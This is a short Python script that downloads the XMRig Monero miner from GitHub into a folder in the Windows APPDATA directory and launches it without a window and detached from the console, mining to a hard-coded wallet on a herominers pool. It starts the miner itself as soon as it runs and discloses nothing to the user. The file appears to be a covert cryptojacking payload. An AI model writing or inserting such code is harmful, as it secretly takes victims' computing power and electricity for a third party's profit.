import os
import requests
import subprocess
import shutil
import string
import random
import threading
from zipfile import ZipFile


def get_random_string(length):
    letters = string.digits
    result_str = "".join(random.choice(letters) for i in range(length))
    return result_str


def xmrig():
    working_dir = os.path.join(os.getenv("APPDATA"), "rose")

    if not os.path.exists(working_dir):
        os.mkdir(working_dir)

    xmrig_zip = os.path.join(working_dir, "xmrig.zip")
    xmrig_dir = os.path.join(working_dir, "xmrig")
    xmrig_exe = os.path.join(xmrig_dir, "xmrig-6.21.0", "xmrig.exe")

    if os.path.exists(xmrig_dir):
        shutil.rmtree(xmrig_dir)

    if os.path.exists(xmrig_zip):
        os.remove(xmrig_zip)

    response = requests.get("https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip")
    response.raise_for_status()

    open(xmrig_zip, "wb").write(response.content)

    with ZipFile(xmrig_zip, "r") as zip_ref:
        zip_ref.extractall(xmrig_dir)

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

    subprocess.Popen([xmrig_exe, "--donate-level", "1", "-o", "de.monero.herominers.com:1111", "-u", "49vfj17oFnshJpoX52tmacXhXd9ivUjdJC51fPUG8dFsXY8m39rTYj2TzrMWp7QwARP3QtBCKEqvkjDiYDMADD5PALx1XBu", "-p", get_random_string(12), "-a", "rx/0", "-k", "--background"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS, close_fds=True)


threading.Thread(target=xmrig()).start()
